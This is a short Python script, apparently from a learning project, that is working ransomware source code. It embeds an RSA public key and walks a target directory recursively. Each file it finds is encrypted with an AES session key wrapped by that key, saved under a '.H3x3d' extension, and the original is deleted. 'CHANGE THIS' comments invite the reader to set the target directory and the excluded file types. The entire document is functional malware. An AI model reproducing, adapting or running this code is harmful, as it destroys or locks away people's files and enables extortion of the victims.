#Import Statement
import base64
import os
from pathlib import Path 
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


#Encode public key with base64 encoding 
pubKey = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAstUx5cs0IRHY6Useo8Vt
cdNTe7qHRulfrQ7b/RklRHX6oFTbQdiBu2VbWzoY+r97JwFOaLlX9CArm5lCNDYh
74dLsxkWwC+dRE9AnGmjQs/tmDN2gmcCJnHdFJmh5d8b/HfbchrJbfsjkn36RldO
mtdf0GS1taCH7YI5seZFURWUroR9Zo+BN6Ilr2mk2oS2pjZqSM4dSAcMIO7gII03
U6kIcuV3f3QxGbezH8QjhNmMTxtnYdpDDBYlJYn+asiciyCD8vOQPZzcBGSfLoF1
ETn04fKt/QknnFwHSkpXKSlYYzeZvo0TDSuU9c84maaF+/lmHcvGT5B7tpSm5dzn
xQIDAQAB'''
pubKey = base64.b64decode(pubKey)


def scanRecursively(baseDir):
    #Goes through and scans all files in a specified directory recursively
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecursively(entry.path)


def encrypt(dataFile, publicKey):
  
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # uses the public key to encrypt the session key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.H3x3d'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)


# change directory to the directory of the script
directory = '/home/ubuntu/PythonMalware/Ransomware' # CHANGE THIS
excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
for item in scanRecursively(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)
